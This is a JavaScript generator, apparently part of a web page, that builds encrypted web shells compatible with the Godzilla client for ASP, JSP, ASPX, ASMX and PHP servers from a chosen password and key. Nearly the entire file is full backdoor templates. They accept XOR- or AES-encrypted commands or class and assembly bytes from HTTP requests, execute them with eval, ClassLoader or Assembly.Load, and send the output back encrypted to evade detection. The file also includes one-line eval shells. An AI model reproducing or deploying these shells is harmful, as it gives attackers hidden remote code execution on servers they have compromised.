  function updateencryptor(){
    var godpayload = document.getElementById("godpayload");
    var encryptor = document.getElementById("encryptor");

    // 清空第二个选项框的选项
    encryptor.innerHTML = "";

    // 根据第一个选项框的值，动态添加第二个选项框的选项
    var selectedValue = godpayload.value;

    if (selectedValue === "AspDynamicPayload") {
      encryptor.options.add(new Option("ASP_EVAL_BASE64", "ASP_EVAL_BASE64"));
      encryptor.options.add(new Option("ASP_XOR_BASE64", "ASP_XOR_BASE64"));
      encryptor.options.add(new Option("ASP_XOR_RAW", "ASP_XOR_RAW"));
      encryptor.options.add(new Option("ASP_RAW", "ASP_RAW"));
      encryptor.options.add(new Option("ASP_BASE64", "ASP_BASE64"));
    } else if (selectedValue === "JavaDynamicPayload") {
      encryptor.options.add(new Option("JAVA_AES_BASE64", "JAVA_AES_BASE64"));
      encryptor.options.add(new Option("JAVA_AES_RAW", "JAVA_AES_RAW"));
    } else if (selectedValue === "CShapDynamicPayload") {
      encryptor.options.add(new Option("CSHAP_ AES_BASE64", "CSHAP_ AES_BASE64"));
      encryptor.options.add(new Option("CSHAP_EVAL_AES_BASE64", "CSHAP_EVAL_AES_BASE64"));
      encryptor.options.add(new Option("CSHAP_ASMX_AES_BASE64", "CSHAP_ASMX_AES_BASE64"));
      encryptor.options.add(new Option("CSHAP_AES_RAW", "CSHAP_AES_RAW"));
    } else if (selectedValue === "PhpDynamicPayload") {
      encryptor.options.add(new Option("PHP_EVAL_XOR_BASE64", "PHP_EVAL_XOR_BASE64"));
      encryptor.options.add(new Option("PHP_XOR_BASE64", "PHP_XOR_BASE64"));
      encryptor.options.add(new Option("PHP_XOR_RAW", "PHP_XOR_RAW"));
    }
  }


  function generateFunction() {
    var key = document.getElementById("key").value;
    var finshell = document.getElementById("finshell");
    var password = document.getElementById("password").value;
    var selectedValue = document.getElementById("godpayload").value;
    var encryptor = document.getElementById("encryptor").value;
    var shell = ''
    if (selectedValue === "AspDynamicPayload") {
      if (encryptor === "ASP_EVAL_BASE64"){
        shell=`<%eval request("${password}")%>`
      }
      if (encryptor === "ASP_XOR_BASE64"){
        var key_md5= encryptStringToMD5(key);
        var pass_key_md5= getMD5(`${password}${key_md5}`);
        var s=pass_key_md5.substring(0, 6);
        var e=pass_key_md5.substring(20,26);
        shell=`<%
Set bypassDictionary = Server.CreateObject("Scripting.Dictionary")

Function Base64Decode(ByVal vCode)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    Base64Decode = oNode.nodeTypedValue
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function decryption(content,isBin)
    dim size,i,result,keySize
    keySize = len(key)
    Set BinaryStream = CreateObject("ADODB.Stream")
    BinaryStream.CharSet = "iso-8859-1"
    BinaryStream.Type = 2
    BinaryStream.Open
    if IsArray(content) then
        size=UBound(content)+1
        For i=1 To size
            BinaryStream.WriteText chrw(ascb(midb(content,i,1)) Xor Asc(Mid(key,(i mod keySize)+1,1)))
        Next
    end if
    BinaryStream.Position = 0
    if isBin then
        BinaryStream.Type = 1
        decryption=BinaryStream.Read()
    else
        decryption=BinaryStream.ReadText()
    end if

End Function
    key="${key_md5}"
    content=request.Form("${password}")
    if not IsEmpty(content) then

        if  IsEmpty(Session("payload")) then
            content=decryption(Base64Decode(content),false)
            Session("payload")=content
            response.End
        else
            content=decryption(Base64Decode(content),true)
            bypassDictionary.Add "payload",Session("payload")
            Execute(bypassDictionary("payload"))
            result=run(content)
            response.Write("${s}")
            if not IsEmpty(result) then
                response.Write Base64Encode(decryption(result,true))
            end if
            response.Write("${e}")
        end if
    end if
%>
`
      }
      if (encryptor === "ASP_XOR_RAW"){
        shell =  `<%
Set bypassDictionary = Server.CreateObject("Scripting.Dictionary")

Function decryption(content,isBin)
    dim size,i,result,keySize
    keySize = len(key)
    Set BinaryStream = CreateObject("ADODB.Stream")
    BinaryStream.CharSet = "iso-8859-1"
    BinaryStream.Type = 2
    BinaryStream.Open
    if IsArray(content) then
        size=UBound(content)+1
        For i=1 To size
            BinaryStream.WriteText chrw(ascb(midb(content,i,1)) Xor Asc(Mid(key,(i mod keySize)+1,1)))
        Next
    end if
    BinaryStream.Position = 0
    if isBin then
        BinaryStream.Type = 1
        decryption=BinaryStream.Read()
    else
        decryption=BinaryStream.ReadText()
    end if

End Function
    key="${encryptStringToMD5(key)}"
    content=Request.BinaryRead(Request.TotalBytes)
    if not IsEmpty(content) then

        if  IsEmpty(Session("payload")) then
            content=decryption(content,false)
            Session("payload")=content
            response.End
        else
            content=decryption(content,true)
            bypassDictionary.Add "payload",Session("payload")
            Execute(bypassDictionary("payload"))
            result=run(content)
            if not IsEmpty(result) then
                response.BinaryWrite decryption(result,true)
            end if
        end if
    end if
%>
`
      }
      if (encryptor === "ASP_RAW"){
        shell=`<%
Set bypassDictionary = Server.CreateObject("Scripting.Dictionary")

Function decryption(content,isBin)
    dim size,i,result,keySize
    keySize = len(key)
    Set BinaryStream = CreateObject("ADODB.Stream")
    BinaryStream.CharSet = "iso-8859-1"
    BinaryStream.Type = 2
    BinaryStream.Open
    if IsArray(content) then
        size=UBound(content)+1
        For i=1 To size
            BinaryStream.WriteText chrw(ascb(midb(content,i,1)))
        Next
    end if
    BinaryStream.Position = 0
    if isBin then
        BinaryStream.Type = 1
        decryption=BinaryStream.Read()
    else
        decryption=BinaryStream.ReadText()
    end if

End Function
    content = request.BinaryRead(request.TotalBytes)
    if len(request.Cookies.Item("${password}"))>0  then
        if  IsEmpty(Session("payload")) then
            content=decryption(content,false)
            Session("payload")=content
            response.End
        else
            bypassDictionary.Add "payload",Session("payload")
            Execute(bypassDictionary("payload"))
            result=run(content)
            if not IsEmpty(result) then
                response.BinaryWrite result
            end if
        end if
    end if
%>
`
      }
      if (encryptor === "ASP_BASE64"){
        var key_md5= encryptStringToMD5(key);
        var pass_key_md5= getMD5(`${password}${key_md5}`);
        var s=pass_key_md5.substring(0, 6);
        var e=pass_key_md5.substring(20,26);
        shell=`<%
Set bypassDictionary = Server.CreateObject("Scripting.Dictionary")

Function Base64Decode(ByVal vCode)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    Base64Decode = oNode.nodeTypedValue
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function decryption(content,isBin)
    dim size,i,result,keySize
    keySize = len(key)
    Set BinaryStream = CreateObject("ADODB.Stream")
    BinaryStream.CharSet = "iso-8859-1"
    BinaryStream.Type = 2
    BinaryStream.Open
    if IsArray(content) then
        size=UBound(content)+1
        For i=1 To size
            BinaryStream.WriteText chrw(ascb(midb(content,i,1)))
        Next
    end if
    BinaryStream.Position = 0
    if isBin then
        BinaryStream.Type = 1
        decryption=BinaryStream.Read()
    else
        decryption=BinaryStream.ReadText()
    end if

End Function
    content=request.Form("${password}")
    if not IsEmpty(content) then

        if  IsEmpty(Session("payload")) then
            content=decryption(Base64Decode(content),false)
            Session("payload")=content
            response.End
        else
            content=Base64Decode(content)
            bypassDictionary.Add "payload",Session("payload")
            Execute(bypassDictionary("payload"))
            result=run(content)
            response.Write("${s}")
            if not IsEmpty(result) then
                response.Write Base64Encode(decryption(result,true))
            end if
            response.Write("${e}")
        end if
    end if
%>
`
      }

    } else if (selectedValue === "JavaDynamicPayload") {
      if (encryptor === "JAVA_AES_BASE64"){
        shell = `<%! String xc="${encryptStringToMD5(key)}"; String pass="${password}"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}
%>`
      }
      if (encryptor === "JAVA_AES_RAW"){
        shell=`<%! String xc="${encryptStringToMD5(key)}"; class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }}
%><%try{byte[] data=new byte[Integer.parseInt(request.getHeader("Content-Length"))];java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))<data.length);data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters", data);Object f=((Class)session.getAttribute("payload")).newInstance();java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();f.equals(arrOut);f.equals(pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true));} }catch (Exception e){}
%>`
      }

    } else if (selectedValue === "CShapDynamicPayload") {
      if (encryptor === "CSHAP_ AES_BASE64"){
         shell=`<%@ Page Language="C#"%><%try { string key = "${encryptStringToMD5(key)}"; string pass = "${password}"; string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace("-", ""); byte[] data = System.Convert.FromBase64String(Context.Request[pass]); data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length); if (Context.Session["payload"] == null) { Context.Session["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data }); ; } else { System.IO.MemoryStream outStream = new System.IO.MemoryStream(); object o = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY"); o.Equals(Context); o.Equals(outStream); o.Equals(data); o.ToString(); byte[] r = outStream.ToArray(); Context.Response.Write(md5.Substring(0, 16)); Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16)); } } catch (System.Exception) { }
%>` 
      }
      if (encryptor === "CSHAP_EVAL_AES_BASE64"){
        shell=`<%@ Page Language="Jscript"%><%eval(Request.Item["${password}"],"unsafe");%>`
      }
      if (encryptor === "CSHAP_ASMX_AES_BASE64"){
        shell=`<%@ WebService Language="C#" Class="WebService1" %>
public class WebService1 : System.Web.Services.WebService
{

        [System.Web.Services.WebMethod(EnableSession = true)]
        public string pass(string pass)
        {
			System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
            try { string key = "${encryptStringToMD5(key)}"; string pass_pass = "${password}"; string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass_pass + key))).Replace("-", ""); byte[] data = System.Convert.FromBase64String(System.Web.HttpUtility.UrlDecode(pass)); data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length); if (Context.Session["payload"] == null) { Context.Session["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data }); ; } else { object o = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY"); System.IO.MemoryStream outStream = new System.IO.MemoryStream(); o.Equals(Context); o.Equals(outStream); o.Equals(data); o.ToString(); byte[] r = outStream.ToArray(); stringBuilder.Append(md5.Substring(0, 16)); stringBuilder.Append(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); stringBuilder.Append(md5.Substring(16)); } } catch (System.Exception) { }
			return stringBuilder.ToString();
		}
    
}`
      }
      if (encryptor === "CSHAP_AES_RAW"){
        shell=`<%@ Page Language="C#"%><%try{string key = "${encryptStringToMD5(key)}";byte[] data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(Context.Request.BinaryRead(Context.Request.ContentLength), 0, Context.Request.ContentLength);if (Context.Session["payload"] == null){ Context.Session["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });}else{ object o = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY"); System.IO.MemoryStream outStream = new System.IO.MemoryStream();o.Equals(outStream);o.Equals(Context); o.Equals(data);o.ToString();byte[] r = outStream.ToArray();outStream.Dispose();Context.Response.BinaryWrite(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length));}}catch(System.Exception){}
%>`
      }
    } else if (selectedValue === "PhpDynamicPayload") {
      if (encryptor === "PHP_EVAL_XOR_BASE64"){
         shell = `<?php eval($_POST["${password}"]);` 
      }
      if (encryptor === "PHP_XOR_BASE64"){
        shell=`<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D; 
}
$pass='${password}';
$payloadName='payload';
$key='${encryptStringToMD5(key)}';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
`
      }
      if (encryptor === "PHP_XOR_RAW"){
        shell=`<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$payloadName='payload';
$key='${encryptStringToMD5(key)}';
$data=file_get_contents("php://input");
if ($data!==false){
    $data=encode($data,$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo encode(@run($data),$key);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
`
      }
    }
    finshell.textContent=shell
  }